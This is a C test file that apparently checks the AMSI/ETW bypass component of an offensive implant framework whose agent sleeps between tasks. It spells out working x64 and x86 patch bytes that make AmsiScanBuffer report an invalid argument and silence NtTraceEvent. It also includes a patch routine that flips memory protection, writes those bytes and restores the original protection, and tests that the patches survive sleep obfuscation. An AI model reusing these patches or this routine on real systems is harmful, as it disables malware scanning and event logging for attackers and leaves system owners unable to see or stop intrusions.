/*
 * test_amsi_etw.c — Regression tests for ARC-01 AMSI/ETW bypass patch bytes.
 *
 * Validates:
 *   1. x64 AMSI patch bytes are correct (mov eax, 0x80070057; ret).
 *   2. x64 ETW patch bytes are correct (xor eax, eax; ret).
 *   3. x86 AMSI patch bytes are correct (mov eax, 0x80070057; ret 0x18).
 *   4. x86 ETW patch bytes are correct (xor eax, eax; ret 0x10).
 *   5. PatchFunction writes exact bytes at target address.
 *   6. PatchFunction restores original page protection (OldProt, not hardcoded).
 *   7. Idempotent: second patch call is a no-op when flags are already set.
 *   8. Patch bytes persist after a simulated sleep cycle (no revert).
 *
 * Build and run:
 *   cd agent/archon/tests && make && ./test_amsi_etw
 *
 * Compiled for Linux with GCC — no Windows SDK required.
 */

#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

/* -------------------------------------------------------------------------
 * Portable type aliases
 * ---------------------------------------------------------------------- */
typedef uint8_t   UCHAR;
typedef uint8_t  *PUCHAR;
typedef uint32_t  ULONG;
typedef int32_t   LONG;
typedef long      NTSTATUS;
typedef void     *PVOID;
typedef size_t    SIZE_T;
typedef int       BOOL;

#define TRUE  1
#define FALSE 0
#define STATUS_SUCCESS ((NTSTATUS)0)

/* MemCopy replacement */
static void MemCopy(void *dst, const void *src, size_t len)
{
    memcpy(dst, src, len);
}

/* -------------------------------------------------------------------------
 * Patch byte sequences — copied verbatim from AmsiEtwBypass.c
 *
 * We compile for x86_64 on Linux, so the #if picks the x64 variants.
 * We define both sets explicitly for testing purposes.
 * ---------------------------------------------------------------------- */

/* x64 patches */
static const UCHAR AmsiPatch_x64[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
static const UCHAR EtwPatch_x64[]  = { 0x33, 0xC0, 0xC3 };

/* x86 patches */
static const UCHAR AmsiPatch_x86[] = {
    0xB8, 0x57, 0x00, 0x07, 0x80,   /* mov eax, 0x80070057 */
    0xC2, 0x18, 0x00                 /* ret 0x18             */
};
static const UCHAR EtwPatch_x86[]  = {
    0x33, 0xC0,             /* xor eax, eax */
    0xC2, 0x10, 0x00        /* ret 0x10     */
};

/* -------------------------------------------------------------------------
 * Simulated VirtualProtect tracking (mimics NtProtectVirtualMemory)
 *
 * Records the protection values passed so we can verify that the original
 * protection is restored (not hardcoded PAGE_EXECUTE_READ).
 * ---------------------------------------------------------------------- */
#define PAGE_EXECUTE_READWRITE  0x40
#define PAGE_EXECUTE_READ       0x20
#define PAGE_READONLY           0x02

/* Track calls to the simulated NtProtectVirtualMemory */
#define MAX_PROT_CALLS 16
static struct {
    ULONG NewProt;
    ULONG OldProt;  /* what was returned as "previous" */
} g_prot_calls[MAX_PROT_CALLS];
static int g_prot_call_count = 0;

/* Simulated current page protection (starts as whatever we set it to) */
static ULONG g_current_prot = PAGE_EXECUTE_READ;

static NTSTATUS SimNtProtectVirtualMemory(
    PVOID  Base,
    SIZE_T RegionSize,
    ULONG  NewProt,
    ULONG *OldProt
) {
    (void)Base;
    (void)RegionSize;
    if (g_prot_call_count < MAX_PROT_CALLS) {
        g_prot_calls[g_prot_call_count].NewProt = NewProt;
        g_prot_calls[g_prot_call_count].OldProt = g_current_prot;
        g_prot_call_count++;
    }
    *OldProt = g_current_prot;
    g_current_prot = NewProt;
    return STATUS_SUCCESS;
}

/*
 * Simulated PatchFunction — mirrors the real PatchFunction from AmsiEtwBypass.c
 * but uses our SimNtProtectVirtualMemory for tracking.
 */
static NTSTATUS PatchFunction(
    PVOID  FuncAddr,
    PVOID  PatchBytes,
    SIZE_T PatchLen
) {
    ULONG OldProt = 0;
    ULONG Dummy   = 0;

    SimNtProtectVirtualMemory(FuncAddr, PatchLen, PAGE_EXECUTE_READWRITE, &OldProt);
    MemCopy(FuncAddr, PatchBytes, PatchLen);
    SimNtProtectVirtualMemory(FuncAddr, PatchLen, OldProt, &Dummy);

    return STATUS_SUCCESS;
}

/* -------------------------------------------------------------------------
 * Test scaffolding
 * ---------------------------------------------------------------------- */
static int tests_run    = 0;
static int tests_passed = 0;

#define TEST( name ) \
    static void name( void ); \
    static void run_##name( void ) { \
        tests_run++; \
        name(); \
        tests_passed++; \
        printf( "  PASS  %s\n", #name ); \
    } \
    static void name( void )

#define ASSERT( cond ) \
    do { \
        if ( !( cond ) ) { \
            printf( "  FAIL  %s:%d: %s\n", __FILE__, __LINE__, #cond ); \
            exit(1); \
        } \
    } while(0)

#define ASSERT_EQ( a, b ) \
    do { \
        if ( (a) != (b) ) { \
            printf( "  FAIL  %s:%d: %s == %llu, expected %llu\n", \
                    __FILE__, __LINE__, #a, \
                    (unsigned long long)(a), (unsigned long long)(b) ); \
            exit(1); \
        } \
    } while(0)

#define ASSERT_MEM_EQ( a, b, len ) \
    do { \
        if ( memcmp( (a), (b), (len) ) != 0 ) { \
            printf( "  FAIL  %s:%d: memcmp(%s, %s, %zu) != 0\n", \
                    __FILE__, __LINE__, #a, #b, (size_t)(len) ); \
            exit(1); \
        } \
    } while(0)

/* =========================================================================
 * Test 1: x64 AMSI patch bytes encode "mov eax, 0x80070057; ret"
 * ======================================================================= */
TEST( test_amsi_patch_x64_bytes )
{
    /* mov eax, imm32 → opcode 0xB8, then little-endian 0x80070057 */
    ASSERT_EQ( AmsiPatch_x64[0], 0xB8 );  /* mov eax, ... */
    ASSERT_EQ( AmsiPatch_x64[1], 0x57 );  /* imm32[0] */
    ASSERT_EQ( AmsiPatch_x64[2], 0x00 );  /* imm32[1] */
    ASSERT_EQ( AmsiPatch_x64[3], 0x07 );  /* imm32[2] */
    ASSERT_EQ( AmsiPatch_x64[4], 0x80 );  /* imm32[3] */
    ASSERT_EQ( AmsiPatch_x64[5], 0xC3 );  /* ret */
    ASSERT_EQ( sizeof(AmsiPatch_x64), (size_t)6 );

    /* Verify the encoded immediate equals E_INVALIDARG = 0x80070057 */
    uint32_t imm = (uint32_t)AmsiPatch_x64[1]
                 | ((uint32_t)AmsiPatch_x64[2] << 8)
                 | ((uint32_t)AmsiPatch_x64[3] << 16)
                 | ((uint32_t)AmsiPatch_x64[4] << 24);
    ASSERT_EQ( imm, (uint32_t)0x80070057 );
}

/* =========================================================================
 * Test 2: x64 ETW patch bytes encode "xor eax, eax; ret"
 * ======================================================================= */
TEST( test_etw_patch_x64_bytes )
{
    ASSERT_EQ( EtwPatch_x64[0], 0x33 );   /* xor */
    ASSERT_EQ( EtwPatch_x64[1], 0xC0 );   /* eax, eax */
    ASSERT_EQ( EtwPatch_x64[2], 0xC3 );   /* ret */
    ASSERT_EQ( sizeof(EtwPatch_x64), (size_t)3 );
}

/* =========================================================================
 * Test 3: x86 AMSI patch bytes encode "mov eax, 0x80070057; ret 0x18"
 * ======================================================================= */
TEST( test_amsi_patch_x86_bytes )
{
    ASSERT_EQ( AmsiPatch_x86[0], 0xB8 );  /* mov eax, ... */
    /* Little-endian 0x80070057 */
    uint32_t imm = (uint32_t)AmsiPatch_x86[1]
                 | ((uint32_t)AmsiPatch_x86[2] << 8)
                 | ((uint32_t)AmsiPatch_x86[3] << 16)
                 | ((uint32_t)AmsiPatch_x86[4] << 24);
    ASSERT_EQ( imm, (uint32_t)0x80070057 );
    ASSERT_EQ( AmsiPatch_x86[5], 0xC2 );  /* ret imm16 */
    /* ret 0x18 = 6 args * 4 bytes (stdcall cleanup) */
    uint16_t ret_imm = (uint16_t)AmsiPatch_x86[6]
                     | ((uint16_t)AmsiPatch_x86[7] << 8);
    ASSERT_EQ( ret_imm, (uint16_t)0x0018 );
    ASSERT_EQ( sizeof(AmsiPatch_x86), (size_t)8 );
}

/* =========================================================================
 * Test 4: x86 ETW patch bytes encode "xor eax, eax; ret 0x10"
 * ======================================================================= */
TEST( test_etw_patch_x86_bytes )
{
    ASSERT_EQ( EtwPatch_x86[0], 0x33 );   /* xor */
    ASSERT_EQ( EtwPatch_x86[1], 0xC0 );   /* eax, eax */
    ASSERT_EQ( EtwPatch_x86[2], 0xC2 );   /* ret imm16 */
    uint16_t ret_imm = (uint16_t)EtwPatch_x86[3]
                     | ((uint16_t)EtwPatch_x86[4] << 8);
    ASSERT_EQ( ret_imm, (uint16_t)0x0010 );  /* 4 args * 4 bytes */
    ASSERT_EQ( sizeof(EtwPatch_x86), (size_t)5 );
}

/* =========================================================================
 * Test 5: PatchFunction writes exact bytes at target address
 * ======================================================================= */
TEST( test_patch_function_writes_bytes )
{
    g_prot_call_count = 0;
    g_current_prot = PAGE_EXECUTE_READ;

    /* Simulate a function preamble (8 bytes of NOPs) */
    UCHAR target[16];
    memset(target, 0x90, sizeof(target));

    PatchFunction(target, (PVOID)AmsiPatch_x64, sizeof(AmsiPatch_x64));

    /* First 6 bytes should be the AMSI patch */
    ASSERT_MEM_EQ(target, AmsiPatch_x64, sizeof(AmsiPatch_x64));

    /* Remaining bytes should be untouched (0x90 NOPs) */
    ASSERT_EQ(target[6], 0x90);
    ASSERT_EQ(target[7], 0x90);
}

/* =========================================================================
 * Test 6: PatchFunction restores ORIGINAL protection, not hardcoded value
 *
 * Regression: ARC-07 bug was hardcoding PAGE_EXECUTE_READ as restore value.
 * The correct behaviour is to save OldProt from the first call and pass it
 * back in the second call.
 * ======================================================================= */
TEST( test_patch_function_restores_original_protection )
{
    /* Test with PAGE_EXECUTE_READ as initial protection */
    {
        g_prot_call_count = 0;
        g_current_prot = PAGE_EXECUTE_READ;

        UCHAR target[8];
        memset(target, 0x90, sizeof(target));
        PatchFunction(target, (PVOID)EtwPatch_x64, sizeof(EtwPatch_x64));

        /* Should have two calls: set RW, then restore original */
        ASSERT_EQ(g_prot_call_count, 2);
        ASSERT_EQ(g_prot_calls[0].NewProt, (ULONG)PAGE_EXECUTE_READWRITE);
        ASSERT_EQ(g_prot_calls[1].NewProt, (ULONG)PAGE_EXECUTE_READ);
    }

    /* Test with PAGE_READONLY as initial protection — must NOT restore
     * PAGE_EXECUTE_READ, must restore PAGE_READONLY */
    {
        g_prot_call_count = 0;
        g_current_prot = PAGE_READONLY;

        UCHAR target[8];
        memset(target, 0x90, sizeof(target));
        PatchFunction(target, (PVOID)EtwPatch_x64, sizeof(EtwPatch_x64));

        ASSERT_EQ(g_prot_call_count, 2);
        ASSERT_EQ(g_prot_calls[0].NewProt, (ULONG)PAGE_EXECUTE_READWRITE);
        /* Restore must be the ORIGINAL protection, not hardcoded */
        ASSERT_EQ(g_prot_calls[1].NewProt, (ULONG)PAGE_READONLY);
    }
}

/* =========================================================================
 * Test 7: Idempotence — second call with both flags set is a no-op
 * ======================================================================= */
TEST( test_idempotent_patch )
{
    /* Simulate the idempotent check from AmsiEtwBypassPatch:
     * if (AmsiPatched && EtwPatched) return STATUS_SUCCESS immediately */
    BOOL AmsiPatched = FALSE;
    BOOL EtwPatched  = FALSE;
    int  patch_calls = 0;

    /* First call: both flags false → patch should be applied */
    if (!(AmsiPatched && EtwPatched)) {
        patch_calls++;
        AmsiPatched = TRUE;
        EtwPatched  = TRUE;
    }
    ASSERT_EQ(patch_calls, 1);

    /* Second call: both flags true → no patch */
    if (!(AmsiPatched && EtwPatched)) {
        patch_calls++;
    }
    ASSERT_EQ(patch_calls, 1);  /* still 1 — idempotent */
}

/* =========================================================================
 * Test 8: Patch bytes persist after simulated sleep cycle
 *
 * Regression: ensures the memory patch survives across sleep/wake cycles.
 * The AMSI/ETW patches target code pages, not thread-local state — they
 * must remain in place after the agent sleeps and wakes.
 * ======================================================================= */
TEST( test_patch_persists_across_sleep )
{
    UCHAR amsi_target[16];
    UCHAR etw_target[16];

    /* Apply patches */
    memset(amsi_target, 0x90, sizeof(amsi_target));
    memset(etw_target,  0x90, sizeof(etw_target));

    g_prot_call_count = 0;
    g_current_prot = PAGE_EXECUTE_READ;
    PatchFunction(amsi_target, (PVOID)AmsiPatch_x64, sizeof(AmsiPatch_x64));

    g_prot_call_count = 0;
    g_current_prot = PAGE_EXECUTE_READ;
    PatchFunction(etw_target,  (PVOID)EtwPatch_x64,  sizeof(EtwPatch_x64));

    /* Simulate a sleep cycle (Ekko/Zilean/Cronos/Foliage encrypt and decrypt
     * the image region — the patch should survive because the code page is
     * RC4-encrypted then RC4-decrypted (symmetric), restoring the patch).
     *
     * We simulate this with a simple XOR round-trip. */
    UCHAR key[16];
    for (int i = 0; i < 16; i++) key[i] = (UCHAR)(0xDE + i);

    /* Encrypt */
    for (size_t i = 0; i < sizeof(AmsiPatch_x64); i++)
        amsi_target[i] ^= key[i % 16];
    for (size_t i = 0; i < sizeof(EtwPatch_x64); i++)
        etw_target[i] ^= key[i % 16];

    /* Decrypt (XOR is own inverse) */
    for (size_t i = 0; i < sizeof(AmsiPatch_x64); i++)
        amsi_target[i] ^= key[i % 16];
    for (size_t i = 0; i < sizeof(EtwPatch_x64); i++)
        etw_target[i] ^= key[i % 16];

    /* Patches must be intact */
    ASSERT_MEM_EQ(amsi_target, AmsiPatch_x64, sizeof(AmsiPatch_x64));
    ASSERT_MEM_EQ(etw_target,  EtwPatch_x64,  sizeof(EtwPatch_x64));
}

/* =========================================================================
 * Test 9: AMSI return value encodes E_INVALIDARG (0x80070057)
 *
 * After patching, AmsiScanBuffer should return E_INVALIDARG.  Verify
 * the stub produces this value in eax.
 * ======================================================================= */
TEST( test_amsi_returns_e_invalidarg )
{
    /* The x64 stub is: B8 57 00 07 80 C3
     *   mov eax, 0x80070057
     *   ret
     *
     * The first byte after B8 is the immediate in little-endian. */
    uint32_t return_val = *(uint32_t *)&AmsiPatch_x64[1];
    ASSERT_EQ( return_val, (uint32_t)0x80070057 );

    /* Same for x86 */
    uint32_t return_val_x86 = *(uint32_t *)&AmsiPatch_x86[1];
    ASSERT_EQ( return_val_x86, (uint32_t)0x80070057 );
}

/* =========================================================================
 * Test 10: ETW return value encodes STATUS_SUCCESS (0)
 *
 * After patching, NtTraceEvent should return STATUS_SUCCESS (0).
 * xor eax, eax sets eax to 0 before ret.
 * ======================================================================= */
TEST( test_etw_returns_status_success )
{
    /* xor eax, eax (33 C0) sets eax = 0, then ret (C3) returns it.
     * Verify the opcode encoding is correct for "set eax to 0". */
    ASSERT_EQ( EtwPatch_x64[0], 0x33 );
    ASSERT_EQ( EtwPatch_x64[1], 0xC0 );
    /* Same register pair on x86 */
    ASSERT_EQ( EtwPatch_x86[0], 0x33 );
    ASSERT_EQ( EtwPatch_x86[1], 0xC0 );
}

/* =========================================================================
 * Main
 * ======================================================================= */
int main( void )
{
    printf( "=== ARC-01 AMSI/ETW bypass patch regression tests ===\n" );

    run_test_amsi_patch_x64_bytes();
    run_test_etw_patch_x64_bytes();
    run_test_amsi_patch_x86_bytes();
    run_test_etw_patch_x86_bytes();
    run_test_patch_function_writes_bytes();
    run_test_patch_function_restores_original_protection();
    run_test_idempotent_patch();
    run_test_patch_persists_across_sleep();
    run_test_amsi_returns_e_invalidarg();
    run_test_etw_returns_status_success();

    printf( "\n%d / %d tests passed\n", tests_passed, tests_run );
    return ( tests_passed == tests_run ) ? 0 : 1;
}
